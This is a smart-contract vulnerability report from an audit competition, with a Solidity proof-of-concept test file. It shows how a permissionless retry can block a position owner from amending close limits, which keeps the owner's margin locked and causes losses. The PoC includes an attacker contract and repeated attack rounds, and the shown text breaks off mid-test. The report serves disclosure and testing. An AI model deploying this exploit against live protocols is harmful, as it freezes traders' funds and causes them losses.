# \#98008 [SC-High] Permissionless protection retry can prevent the owner from amending close limits, freezing a position's margin

**Submitted on Nov 4th 2026 at 10:57:43 UTC by @mussucal for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98008
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
The MED-9 fix makes position-protection close limits trader-owned and allows the owner to amend them when a protection is `Latched` and has no pending order. However, the permissionless retry mechanism can prevent the owner from reaching that state in a usable transaction.

When a protection close attempt expires, a third party can terminalise the attempt and retry the protection in the **same transaction**. Terminalisation relatches the protection and clears its pending order; the subsequent retry immediately queues another close using the previously retained close limits and changes the protection back to `Triggered`.

The owner’s amendment function requires the protection to be `Latched`. Consequently, after the attacker’s transaction completes, the owner’s amendment reverts with `OrderRouter__ProtectionNotLatched`. The attacker can repeat this terminalise-and-retry sequence at each expiry deadline, keeping a new child order live with the same unamended limits.

This prevents the owner from amending limits that are too restrictive to execute and from using the available close routes while the protection remains active. The position’s margin remains locked.

The proof of concept demonstrates **3,660 seconds of continuous denial**, during which **1,996 USDG of clearinghouse margin remains locked and unwithdrawable**. In a separate same-snapshot comparison, the owner loses **150.060530 USDG of total trader value against the honest exit path**, even after adding margin to avoid liquidation.

## Vulnerability Details
### Relevant protocol behaviour

The MED-9 change makes close limits owner-controlled. The owner can amend retained limits through `amendLatchedPositionProtectionCloseLimits`, but the function requires the protection to be `Latched` and the account to have no pending orders.

The relevant checks are:

```solidity
// PositionProtectionBook.sol:315-329
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection =
        _ownedActiveProtection(protectionId, msg.sender);

    if (protection.status != PositionProtectionStatus.Latched)
        revert OrderRouter__ProtectionNotLatched();

    if (
        IPositionProtectionRouterHost(ROUTER)
            .pendingOrderCounts(msg.sender) != 0
    ) revert OrderRouter__PendingOrdersExist();

    _setCloseLimits(protection, limits);
    ...
}
```

By contrast, `retryPositionProtectionClose` is permissionless. It requires a `Latched` protection and an empty pending-order queue, then creates another close attempt using the protection’s retained limits:

```solidity
// PositionProtectionBook.sol:382-404
function retryPositionProtectionClose(uint64 protectionId) external ... {
    ...
    if (protection.status != PositionProtectionStatus.Latched)
        revert OrderRouter__ProtectionNotLatched();

    if (router.pendingOrderCounts(protection.account) != 0)
        revert OrderRouter__PendingOrdersExist();

    ... // queues a new close using the retained limits
}
```

Recording the new attempt sets the protection back to `Triggered` (`PositionProtectionBook.sol:573`).

When an expired protection attempt is terminalised, the router first informs the protection book that the attempt failed, which relatches the protection, and then deletes the order:

```solidity
// OrderRouter.sol:208-230 and :292-363
positionProtectionBook.handleFailedProtectionAttempt(
    orderId,
    account,
    reason
); // PositionProtectionBook.sol:666 — status becomes Latched

_deleteOrder(orderId, OrderStatus.Failed);
// pendingOrderCounts becomes zero
```

These transitions allow a caller to invoke the retry function immediately after terminalisation in the same transaction.

### Attack sequence

The attack requires a position protection whose retained close limits are too restrictive to fill at the current execution price. This is a documented operating condition: the MED-9 resolution states that tight limits may prevent execution until conditions improve or the owner amends them.

The attack proceeds as follows:

1. A protection triggers and queues a close attempt using the owner's retained limits.
2. The close attempt cannot execute within its execution window because the limits cannot be satisfied.
3. At the public expiry deadline, an attacker contract calls the router's expiry/terminalisation route.
4. Terminalisation calls `handleFailedProtectionAttempt`, relatching the protection, and deletes the expired order, clearing the pending-order count.
5. In the **same transaction**, the attacker calls `retryPositionProtectionClose`.
6. The retry creates a new child attempt using the same retained limits and changes the protection to `Triggered`.
7. After the attacker’s transaction completes, the owner attempts to amend the limits. The call reverts because the protection is no longer `Latched`.
8. The new child attempt eventually expires, allowing the attacker to repeat the sequence.

The key point is that the `Latched` state and empty queue exist only transiently inside the attacker's transaction. The attacker does not need to observe the owner's transaction in the mempool or react to an amendment attempt. The expiry deadline is public and determined by the committed order's execution window.

With the release configuration, `maxExecutionWindowSeconds + 1` is 61 seconds. The proof of concept repeats the sequence for 60 rounds, demonstrating 3,660 seconds of denial.

### Why the owner cannot use another exit route

While the protection remains active and its child order is live:

- An ordinary close through `router.commitOrder` is rejected with `OrderRouter__ProtectionActive`.
- `cancelPositionProtection` is unavailable because cancellation accepts only `PendingOpen` or `Armed` protections.
- `replacePositionProtection` is unavailable for the same state restriction.
- `cancelPositionProtectionAndCommitClose` is likewise unavailable.
- `amendLatchedPositionProtectionCloseLimits` reverts with `OrderRouter__ProtectionNotLatched`.

The proof of concept checks these routes during the denial, including at rounds 1, 30 and 60.

The owner can add margin through `CfdEngine.addMargin`, which is not gated by the protection. However, adding margin does not close the position or prevent the exposure loss caused by being unable to exit.

### Relationship to the documented retry limitation

The protocol documents that retries are permissionless and do not re-evaluate the original trigger. It also documents the possibility of a protection remaining `Latched` without a live child when keepers do not process failed attempts and retry them.

That disclosure concerns a protection remaining `Latched` with no live child. This issue is different: the attacker repeatedly retries immediately after terminalisation, so a live child is continually restored. The documented alert for a prolonged `Latched` state without a live child therefore does not detect this attack state.

The existing test `PositionProtection.t.sol::test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` does not exercise this sequence. It tests the owner amending first, followed by a retry that uses the amended limits, and then a second amendment that correctly reverts. It does not test a permissionless retry pre-empting the owner's **first** amendment.

The MED-9 restriction prevents third parties from relaxing the owner's close ceilings. It does not prevent a third party from repeatedly using those same ceilings to keep the protection out of the state in which the owner is permitted to amend them.

### Transaction-ordering qualification

An owner using a smart account or EIP-7702 batch can terminalise the expired attempt and amend the limits atomically. The control test `test_control_AtomicOwnerWinsTheWindow` demonstrates this countermeasure.

An EOA owner cannot perform those two actions in one transaction. The owner and attacker must compete to terminalise the expired attempt at the deadline. The attacker must win each deadline to sustain the denial.

The transaction-ordering outcome and the probability of an EOA owner winning this competition on Arbitrum have **not been measured**. The finding therefore does not rely on a claim that the attacker is guaranteed to win every deadline.

## Impact Details
### 1. Position exit is denied

The owner cannot close the protected position through the ordinary close, cancel, replace, cancel-and-close, or close-limit amendment routes while the attacker maintains a live child attempt.

The denial is repeatable because each new attempt retains the same unamended limits. The attack does not merely delay a single retry; it repeatedly prevents the owner from accessing the amendment state intended to resolve an unfillable close.

### 2. Position margin remains locked and unwithdrawable

`test_D17_OneHour_PositionMarginFrozen` demonstrates 60 rounds of denial over **3,660 seconds**.

The measured balances are:

- Position margin in the engine: **1,986 USDG**.
- Margin locked in the clearinghouse: **1,996 USDG**.

The test verifies that a withdrawal of `balance − locked + 1` reverts, while a withdrawal of `balance − locked` succeeds. After that maximum withdrawal, the remaining balance is **1,995.999633 USDG**; a further one-atom withdrawal reverts.

This demonstrates that the position margin remains locked while free settlement above the locked amount remains withdrawable. The 3,660 seconds is the duration demonstrated under the tested conditions, not a guaranteed minimum or maximum. The attacker can continue the denial for as long as it keeps winning the terminalisation competition at each deadline.

### 3. The owner suffers material trading losses despite adding margin

`test_D17_TotalTraderValue_ThreeScenarios` compares three scenarios from the same initial snapshot. Total trader value is calculated as:

**Wallet USDG + clearinghouse settlement + engine trader claim − unsettled carry debt.**

The test also verifies that the position is closed and no margin remains locked at measurement time.

| Scenario | Description | Total trader value |
|---|---|---:|
| B — Control | No attacker. Owner amends at the first latch and exits at the stop loss. | **341.779991 USDG** |
| A — Attack, passive owner | Owner cannot exit and is liquidated after the hour. | **185.799450 USDG** |
| C — Attack, owner mitigates | Owner adds 148.8 USDG margin, avoids liquidation, but cannot exit until the attack ends. | **191.719461 USDG** |

The measured differences are:

- **B − A = 155.980541 USDG:** total trader-value loss for the passive owner compared with the honest exit.
- **B − C = 150.060530 USDG:** exposure loss suffered even though the owner adds margin to avoid liquidation.
- **C − A = 5.920011 USDG:** liquidation penalty avoided by adding margin.

The owner can therefore mitigate liquidation by adding margin, but cannot avoid the exposure loss while the protection prevents an exit.

### 4. Attacker cost and incentive

The one-hour demonstration requires 60 attacker transactions. The recorded gas consumption is approximately 57–68 million L2 gas, depending on the tested profile.

At an assumed Arbitrum base fee of 0.01 gwei, the estimated cost is approximately 0.00057–0.00068 ETH. This is an assumption-based estimate, not a measured historical transaction cost.

The attacker receives no direct profit from the denial itself. The same party may, however, receive the liquidation keeper bounty if the owner does not add sufficient margin and the position is liquidated.

## References
### In-scope contracts

1. `packages/perps/src/PositionProtectionBook.sol`
   - `amendLatchedPositionProtectionCloseLimits` — owner authorization, `Latched` status and empty-queue requirements (lines 315–329).
   - `retryPositionProtectionClose` — permissionless retry and retained close-limit use (lines 382–404).
   - `_recordCloseAttempt` — transition to `Triggered` (line 573).
   - `handleFailedProtectionAttempt` — relatching after a failed attempt (line 666).

2. `packages/perps/src/OrderRouter.sol`
   - `expireMismatchedOrderFromSidecar` and `settleOrderFromSidecar` — terminalisation and order deletion (lines 208–230 and 292–363).

3. `packages/perps/src/OrderLiquidationBatchLogic.sol`
   - Protection-active gate preventing ordinary order commits for a protected account (lines 313–314).

4. `packages/perps/src/CfdEngine.sol`
   - `addMargin` — owner can add margin during the denial (line 501).

5. `packages/perps/src/MarginClearinghouse.sol`
   - `withdraw` — withdrawal boundary enforcing locked-margin availability (line 470).

### Protocol documentation

6. `SECURITY.md`
   - Lines 547–552: irreversible trigger, `Triggered` and `Latched` semantics, permissionless retry and no trigger re-evaluation.
   - Lines 1356–1359: known limitation concerning failed-attempt cleanup, retries and monitoring of prolonged `Latched` state without a live child.

7. MED-9 resolution
   - Documents trader ownership of close ceilings and amendment as the remedy when tight limits prevent execution.

### Tests and reproduction artifacts

8. `test/perps/spec/trader/PositionProtection.t.sol`
    - Existing test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` (lines 954–1005).
    - The existing test amends before retrying; it does not test a retry pre-empting the owner's first amendment.

9. `packages/perps/test/poc/PoC_PositionProtectionBook_RetryPreemptsAmend.t.sol`
   - Vulnerable implementation reproduction and controls (13 tests).
   - Includes the public-path atomic retry reproduction, repeatability, one-hour margin freeze, liquidation and three-scenario total-value comparison.  

## Proof of Concept

## Proof of Concept
### PoC_PositionProtectionBook_RetryPreemptsAmend.t.sol
```solidity
// SPDX-License-Identifier: AGPL-3.0
// poc-group-key: PositionProtectionBook|retryPositionProtectionClose|permissionless-retry-preempts-owner-amendment
// poc-instance: UNDECLARED
//
// Claim under test (shortlist row 16, "D-17"): while a position protection is
// `Latched`, the owner's ONLY way to make the retained close executable is
// `amendLatchedPositionProtectionCloseLimits`, and that function requires
// `pendingOrderCounts(owner) == 0`. `retryPositionProtectionClose` is
// permissionless and queues a fresh child using the UNAMENDED limits, which
// makes the count nonzero and flips the status out of `Latched`. A third party
// can therefore keep the owner permanently away from the remediation Cecuro
// MED-9 was fixed with.
//
// The correction this file makes to the proposed attack model: the latch and
// the pending-order clearing happen in the SAME transaction (OrderRouter
// `settleOrderFromSidecar` / `expireMismatchedOrderFromSidecar` call
// `handleFailedProtectionAttempt` and then `_deleteOrder`). There is no
// separate owner cleanup step to race. Whoever lands the terminalising call can
// append the retry inside that same transaction, so the owner is never offered
// an interval at all. No transaction-ordering assumption is needed for the
// pre-emption itself -- only for who gets to terminalise.
//
// MEASURED ON THIS FIXTURE (FOUNDRY_PROFILE=quick, forge 1.8.5, commit a82d4fe):
//   * one attacker transaction buys 61 s of denial (the Router's
//     `maxExecutionWindowSeconds` + 1) at 1,135,950 gas;
//   * over five rounds the owner is denied for 305 s and cannot close by any
//     route in any block of it;
//   * Stage 2, same position and same stop loss, attacker present vs absent:
//     final settlement 185.799954 USDG vs 341.779991 USDG, i.e. 155.980037 USDG
//     of a 236.0 USDG position margin, because the stop loss at 1.00500000
//     became a liquidation at 1.02000000.
//
// WHAT THIS DOES NOT ESTABLISH. The attacker gains nothing directly -- this is
// griefing, and the only monetisable leg is that the same party can take the
// liquidation keeper bounty at the end. The denial also requires the attacker to
// be the one who terminalises each expired child:
// `test_control_AtomicOwnerWinsTheWindow` shows a smart-account owner that
// terminalises and amends in one transaction defeats it permanently, so an EOA
// owner must win a race each round while the attacker must win only once to buy
// another window. Severity therefore rests on that contest, not on the
// mechanism, which is unconditional.
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev The two Router entrypoints either actor needs. Declared locally so the
///      helper contracts below stay independent of the test harness.
interface IExecuteHost {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

    function commitOrder(
        OrderV3Types.OrderRequest calldata request
    ) external returns (uint64 orderId);

}

/// @notice The attacker. Holds no position, no role and no stake in the protection.
contract RetryPreemptor {

    /// @notice Terminalises the owner's live protection child and immediately
    ///         re-queues it with the owner's unamended limits, atomically.
    function latchAndPreempt(
        address router,
        address book,
        uint64 orderId,
        uint64 protectionId
    ) external returns (uint64 retryOrderId) {
        IExecuteHost(router).executeOrder(orderId, new bytes[](0));
        retryOrderId = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }

}

/// @notice The owner, as a smart account, so the control can batch.
contract OwnerSmartAccount {

    function approveAndDeposit(
        address token,
        address clearinghouse,
        uint256 amount
    ) external {
        (bool ok,) = token.call(abi.encodeWithSignature("approve(address,uint256)", clearinghouse, amount));
        require(ok, "approve");
        (ok,) = clearinghouse.call(abi.encodeWithSignature("deposit(address,uint256)", address(this), amount));
        require(ok, "deposit");
    }

    function createProtection(
        address book,
        PositionProtectionTypes.PositionProtectionParams calldata params
    ) external returns (uint64 protectionId) {
        return IPositionProtectionActions(book).createPositionProtection(params);
    }

    /// @notice The atomic owner countermeasure: terminalise the expired child
    ///         and amend the retained ceilings in one transaction.
    function latchAndAmend(
        address router,
        address book,
        uint64 orderId,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external {
        IExecuteHost(router).executeOrder(orderId, new bytes[](0));
        IPositionProtectionActions(book).amendLatchedPositionProtectionCloseLimits(protectionId, limits);
    }

    function amend(
        address book,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external {
        IPositionProtectionActions(book).amendLatchedPositionProtectionCloseLimits(protectionId, limits);
    }

}

contract PoC_PositionProtectionBook_RetryPreemptsAmend is BasePerpTest {

    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    RetryPreemptor internal preemptor;
    OwnerSmartAccount internal ownerAccount;

    address internal constant OWNER = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);
    address internal constant THIRD_PARTY = address(0xCA201);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;

    // Stage 2 fixture: a thin LONG, so a small adverse move crosses the
    // liquidation threshold inside a handful of denial rounds.
    address internal constant THIN_OWNER = address(0xA11CE2);
    address internal constant LIQUIDATION_KEEPER = address(0xBA7CB0B0);
    uint256 internal constant THIN_FUNDING_ASSETS = 400e6;
    uint256 internal constant THIN_POSITION_SIZE = 10_000e18;
    uint256 internal constant THIN_MARGIN_ASSETS = 250e6;
    uint256 internal constant STOP_LOSS_PRICE = 100_500_000;
    uint256 internal constant LIQUIDATION_MARK_PRICE = 102_000_000;

    function setUp() public override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));

        preemptor = new RetryPreemptor();
        ownerAccount = new OwnerSmartAccount();

        _fundTrader(OWNER, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    // ------------------------------------------------------------------
    // STAGE 1 -- the mechanism
    // ------------------------------------------------------------------

    /// @notice One attacker transaction latches the protection and re-queues it,
    ///         so the owner's amendment window never exists.
    function test_AtomicRetryPreemptsOwnerAmendment() public {
        (uint64 protectionId, uint64 firstAttemptId) = _armAndTriggerWithTightLimits(OWNER);

        // Preconditions: the attempt is live, so the owner cannot amend yet.
        assertEq(router.pendingOrderCounts(OWNER), 1, "the triggered child must be pending");
        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);

        // The child expires. One attacker transaction terminalises it (which
        // latches the protection and drops the pending count to zero) and
        // re-queues the retry with the owner's unamended ceilings.
        _warpPastDeadline(firstAttemptId);
        uint64 retryOrderId =
            preemptor.latchAndPreempt(address(router), address(protectionBook), firstAttemptId, protectionId);

        // The owner never saw a quiet block: status is Triggered again and the
        // pending count is back to one, in the attacker's single transaction.
        assertGt(retryOrderId, firstAttemptId, "attacker queued a fresh child");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "the attacker's retry moved the protection out of Latched"
        );
        assertEq(router.pendingOrderCounts(OWNER), 1, "the attacker's child occupies the owner's queue");

        // THE HARM: the remediation introduced for Cecuro MED-9 is unreachable.
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);

        // And the retry carries the SAME ceilings, so it is pre-destined to fail
        // exactly as its predecessor did.
        OrderV3Types.ExecutionBounds memory policy = router.lifecycleBook().pendingPolicy(retryOrderId);
        assertEq(
            policy.maxExecutionNotionalAssets,
            _tightNotionalCeiling(),
            "the retry reuses the ceiling the owner is trying to raise"
        );

        // The position is still fully open and the owner has no other exit.
        (uint256 remainingSize,,,,,,) = engine.positions(OWNER);
        assertEq(remainingSize, POSITION_SIZE, "the protected position is still open");
        _assertOwnerHasNoOtherExit(protectionId);
    }

    /// @notice Every other owner-side exit from a live protection is closed, so
    ///         the amendment path is the only one -- which is what makes its
    ///         denial consequential rather than cosmetic.
    function test_LatchedOwnerHasNoAlternativeExit() public {
        (uint64 protectionId, uint64 firstAttemptId) = _armAndTriggerWithTightLimits(OWNER);
        _warpPastDeadline(firstAttemptId);

        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(firstAttemptId, new bytes[](0));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "expiry must latch"
        );
        assertEq(router.pendingOrderCounts(OWNER), 0, "latch and queue clearing are the same transaction");

        _assertOwnerHasNoOtherExit(protectionId);

        // With no attacker present the owner CAN amend in this quiet state.
        // This is the positive half: the denial above is the whole defect.
        vm.prank(OWNER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _permissiveLimits());
        assertEq(
            protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
            type(uint256).max,
            "an unmolested owner reaches the remediation"
        );
    }

    /// @notice The same pre-emption with the position and its protection
    ///         established through the production entrypoints only --
    ///         `commitOrder` plus `executeOrder` -- so the finding does not rest
    ///         on `BasePerpTest._open`, which pranks the Router into the Engine.
    function test_PublicPath_AtomicRetryPreemptsOwnerAmendment() public {
        uint64 openOrderId = _commitPublicOpen(OWNER);
        bytes[] memory openPrice = _mockPythUpdateData(MARK_PRICE);
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory openResult = router.executeOrder(openOrderId, openPrice);
        assertEq(
            uint8(openResult.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "the public open must execute through the ordinary queue"
        );
        (uint256 openedSize,,,,,,) = engine.positions(OWNER);
        assertEq(openedSize, POSITION_SIZE, "the position exists through the public path");
        assertEq(router.pendingOrderCounts(OWNER), 0, "the open left the queue empty");

        // `_mockPythUpdateData` staggers feed publish times, which leaves one
        // feed at the mark time the open installed. Reinstall a uniform
        // observation before arming, as the ordinary fixture does.
        _refreshMark(MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = _tightNotionalCeiling();
        vm.prank(OWNER);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        _mockPythUpdateData(LONG_TAKE_PROFIT);
        bytes[] memory updateData = _liveExecutionData(LONG_TAKE_PROFIT);
        vm.prank(TRIGGER_KEEPER);
        uint64 attemptId = protectionActions.triggerPositionProtection(protectionId, updateData);

        _warpPastDeadline(attemptId);
        uint64 retryOrderId =
            preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);

        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "the pre-emption does not depend on the setup shortcut"
        );
        assertEq(router.pendingOrderCounts(OWNER), 1, "the attacker's child occupies the owner's queue");

        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);

        assertEq(
            router.lifecycleBook().pendingPolicy(retryOrderId).maxExecutionNotionalAssets,
            _tightNotionalCeiling(),
            "the retry still reuses the unamended ceiling"
        );
        (uint256 remainingSize,,,,,,) = engine.positions(OWNER);
        assertEq(remainingSize, POSITION_SIZE, "the position is still open");
    }

    // ------------------------------------------------------------------
    // STAGE 1b -- repeatability
    // ------------------------------------------------------------------

    /// @notice The attacker can repeat the cycle. Each round costs the attacker
    ///         one transaction and costs the owner one full execution window in
    ///         which the position cannot be closed by any route.
    function test_PreemptionIsRepeatable() public {
        (uint64 protectionId, uint64 attemptId) = _armAndTriggerWithTightLimits(OWNER);

        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        uint256 startTime = vm.getBlockTimestamp();
        uint256 attackerGas;
        for (uint256 round; round < 5; ++round) {
            _warpPastDeadline(attemptId);
            uint256 gasBefore = gasleft();
            attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
            attackerGas += gasBefore - gasleft();

            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "every round ends with the owner's queue occupied"
            );
            vm.prank(OWNER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
        }

        (uint256 remainingSize,,,,,,) = engine.positions(OWNER);
        assertEq(remainingSize, POSITION_SIZE, "five rounds later the position is still open");
        assertGt(vm.getBlockTimestamp(), startTime, "the denial consumed real time");
        emit log_named_uint("seconds the owner was denied", vm.getBlockTimestamp() - startTime);
        emit log_named_uint("attacker transactions spent", 5);
        emit log_named_uint("attacker gas per round", attackerGas / 5);
    }

    /// @notice The retained ceiling is what makes the denial matter: an honest
    ///         keeper executing the attacker's retry cannot close the position
    ///         either, so the cycle has no self-terminating exit.
    function test_RetainedCeilingMakesEveryRetryFail() public {
        (uint64 protectionId, uint64 attemptId) = _armAndTriggerWithTightLimits(OWNER);

        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(attemptId, executionData);

        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "the retained ceiling rejects the close"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "and the protection returns to Latched, where the cycle restarts"
        );
        (uint256 remainingSize,,,,,,) = engine.positions(OWNER);
        assertEq(remainingSize, POSITION_SIZE, "no retry can close the position until the ceiling is raised");
    }

    // ------------------------------------------------------------------
    // STAGE 2 -- the impact, measured against the honest path
    // ------------------------------------------------------------------

    /// @notice Scenario A. The owner's stop loss triggers, the retained ceiling
    ///         rejects the close, and the attacker denies the amendment while the
    ///         mark keeps moving against the position. The stop loss becomes a
    ///         liquidation. Compare with the control below, which is the same
    ///         position on the same price path with the attacker absent.
    function test_Impact_DenialTurnsAStopLossIntoALiquidation() public {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();

        uint256 marginAtTrigger = _positionMargin(THIN_OWNER);
        assertFalse(
            engineLens.previewLiquidation(THIN_OWNER, STOP_LOSS_PRICE).liquidatable,
            "at the moment the stop loss fires the position is NOT liquidatable"
        );

        // The attacker holds the owner off the amendment while the mark walks up.
        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        uint256 price = STOP_LOSS_PRICE;
        for (uint256 round; round < 5; ++round) {
            _warpPastDeadline(attemptId);
            attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
            vm.prank(THIN_OWNER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);

            price += (LIQUIDATION_MARK_PRICE - STOP_LOSS_PRICE) / 5;
            _refreshMark(price);
        }

        // The position is now liquidatable at a mark the owner was trying to
        // exit well below.
        assertTrue(
            engineLens.previewLiquidation(THIN_OWNER, LIQUIDATION_MARK_PRICE).liquidatable,
            "the denial window carried the position past its liquidation threshold"
        );

        uint256 settlementBefore = _settlementBalance(THIN_OWNER);
        address[] memory accounts = new address[](1);
        accounts[0] = THIN_OWNER;
        bytes[] memory updateData = _liquidationData(LIQUIDATION_MARK_PRICE);
        vm.prank(LIQUIDATION_KEEPER);
        IPerpsKeeper(address(router)).executeLiquidationBatch(accounts, updateData);

        (uint256 remainingSize,,,,,,) = engine.positions(THIN_OWNER);
        assertEq(remainingSize, 0, "a liquidator closed the position the owner could not");
        emit log_named_uint("A: position margin when the stop loss fired", marginAtTrigger);
        emit log_named_uint("A: settlement balance before liquidation", settlementBefore);
        emit log_named_uint("A: final settlement balance", _settlementBalance(THIN_OWNER));
        emit log_named_uint("A: trader claim balance", engine.traderClaimBalanceAssets(THIN_OWNER));
        emit log_named_uint("A: attacker transactions", 5);
    }

    /// @custom:poc-control kind=BOUNDARY
    /// Scenario B. Identical position, identical price path, attacker absent.
    /// The owner amends at the first latch and the retry closes the position at
    /// the stop loss. The difference between the two final settlement balances
    /// is the loss attributable to the denial.
    function test_control_Impact_OwnerAmendsAtFirstLatchAndExits() public {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();

        uint256 marginAtTrigger = _positionMargin(THIN_OWNER);

        // First latch, with nobody pre-empting.
        _warpPastDeadline(attemptId);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, new bytes[](0));

        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        vm.prank(THIN_OWNER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);

        vm.prank(THIRD_PARTY);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(STOP_LOSS_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);

        assertEq(
            uint8(result.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "the unmolested owner exits at the stop loss"
        );
        (uint256 remainingSize,,,,,,) = engine.positions(THIN_OWNER);
        assertEq(remainingSize, 0, "the position is closed, not liquidated");
        emit log_named_uint("B: position margin when the stop loss fired", marginAtTrigger);
        emit log_named_uint("B: final settlement balance", _settlementBalance(THIN_OWNER));
    }

    // ------------------------------------------------------------------
    // CONTROL -- the atomic owner, mandatory per the verification verdict
    // ------------------------------------------------------------------

    /// @custom:poc-control kind=BOUNDARY
    /// A smart-account owner that terminalises the expired child ITSELF, in the
    /// same transaction as the amendment, reaches the remediation and closes the
    /// position. The attack therefore requires the attacker to be the one who
    /// terminalises; it is a contest over that single call, not an unconditional
    /// lockout. This control is EXPECTED TO PASS, and its passing is what bounds
    /// the severity.
    function test_control_AtomicOwnerWinsTheWindow() public {
        _fundTrader(address(ownerAccount), 20_000e6);
        (uint64 protectionId, uint64 firstAttemptId) = _armAndTriggerWithTightLimits(address(ownerAccount));

        _warpPastDeadline(firstAttemptId);

        // One owner transaction: expire + amend.
        ownerAccount.latchAndAmend(
            address(router), address(protectionBook), firstAttemptId, protectionId, _permissiveLimits()
        );
        assertEq(
            protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
            type(uint256).max,
            "the atomic owner raised the ceiling"
        );

        // Now any retry -- the attacker's included -- carries the raised ceiling
        // and executes, which ends the attack permanently.
        vm.prank(THIRD_PARTY);
